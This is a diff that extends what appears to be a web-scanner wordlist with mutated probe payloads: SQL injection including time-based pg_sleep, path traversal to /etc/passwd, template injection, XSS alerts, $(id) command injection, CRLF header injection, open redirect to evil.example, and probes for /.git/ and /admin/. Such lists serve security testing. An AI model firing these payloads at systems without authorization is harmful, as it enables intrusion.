@@ -78,3 +78,163 @@ HTTP%3A%2F%2F127.0.0.1
 HTTPS%3A%2F%2FEXAMPLE.COM
 ' OR '1'%3D'1
 " OR "1"%3D"1
+%252Fuploads%252F
+/uploads/?aurose=1
+/uploads/&aurose=1
+/uploads/.bak
+/uploads/.old
+%252Fbackup%252F
+/backup/?aurose=1
+/backup/&aurose=1
+/backup/.bak
+/backup/.old
+%252Fassets%252F
+/assets/?aurose=1
+/assets/&aurose=1
+/assets/.bak
+/assets/.old
+%252Fprivate%252F
+/private/?aurose=1
+/private/&aurose=1
+/private/.bak
+/private/.old
+%252Flogs%252F
+/logs/?aurose=1
+/logs/&aurose=1
+/logs/.bak
+/logs/.old
+/tmp/
+%2Ftmp%2F
+%252Ftmp%252F
+/TMP/
+/tmp/?aurose=1
+/tmp/&aurose=1
+/tmp/.bak
+/tmp/.old
+/old/
+%2Fold%2F
+%252Fold%252F
+/OLD/
+/old/?aurose=1
+/old/&aurose=1
+/old/.bak
+/old/.old
+/admin/
+%2Fadmin%2F
+%252Fadmin%252F
+/ADMIN/
+/admin/?aurose=1
+/admin/&aurose=1
+/admin/.bak
+/admin/.old
+/.git/
+%2F.git%2F
+%252F.git%252F
+/.GIT/
+/.git/?aurose=1
+/.git/&aurose=1
+/.git/.bak
+/.git/.old
+/api/
+%2Fapi%2F
+%252Fapi%252F
+/API/
+/api/?aurose=1
+/api/&aurose=1
+/api/.bak
+/api/.old
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+/uploads/::var0
+%2Fuploads%2F::v0
+/dirlist/probe/0
+/backup/::var1
+%2Fbackup%2F::v1
+/dirlist/probe/1
+/assets/::var2
+%2Fassets%2F::v2
+/dirlist/probe/2
+/private/::var3
+%2Fprivate%2F::v3
+/dirlist/probe/3
+/logs/::var4
+%2Flogs%2F::v4
+/dirlist/probe/4
+/tmp/::var5
+%2Ftmp%2F::v5
+/dirlist/probe/5
